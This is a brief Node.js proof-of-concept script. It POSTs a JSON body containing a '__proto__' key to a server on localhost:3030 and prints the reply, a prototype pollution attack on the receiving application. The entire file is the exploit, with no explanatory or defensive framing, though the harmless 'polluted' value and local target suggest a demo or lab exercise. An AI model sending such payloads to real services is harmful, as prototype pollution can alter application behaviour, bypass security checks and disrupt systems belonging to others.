const http = require('http');
const client = http.request({
    host: 'localhost',
    port: 3030,
    method: 'POST'
}, (res) => {
    res.on('data', (chunk) => {
        console.log(chunk.toString());
    });
});
data = '{"__proto__": {"status": "polluted"}, "name": "iamking", "status":"sleepy"}';
client.setHeader('content-type', 'application/json');
client.end(data); 